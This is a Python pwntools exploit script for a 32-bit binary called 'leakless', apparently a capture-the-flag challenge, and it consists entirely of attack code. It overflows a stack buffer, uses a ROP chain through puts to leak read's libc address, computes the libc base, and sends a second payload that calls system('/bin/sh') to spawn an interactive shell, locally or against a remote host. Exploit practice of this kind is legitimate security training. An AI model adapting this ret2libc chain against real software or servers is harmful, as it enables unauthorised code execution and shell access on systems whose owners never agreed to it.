#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./leakless"
libc = ELF("/usr/lib32/libc-2.33.so")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        b *feedme+46
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

rop_pop_ebx = 0x08049022
payload = b"A" * 76
payload += p32(elf.plt['puts'])
payload += p32(rop_pop_ebx)
payload += p32(elf.got['read'])
payload += p32(elf.symbols['feedme'])

sleep(0.5)
p.send(payload)

libc_read =  u32(p.recv(4))
log.info("read@libc: 0x{:08x}".format(libc_read))
libc_base = libc_read - libc.symbols['read']
log.info("libc base: 0x{:08x}".format(libc_base))

payload = b"A" * 76
payload += p32(libc_base + libc.symbols['system'])
payload += p32(rop_pop_ebx)
payload += p32(libc_base + list(libc.search(b"/bin/sh"))[0])

sleep(1.0)
p.send(payload)

p.interactive()
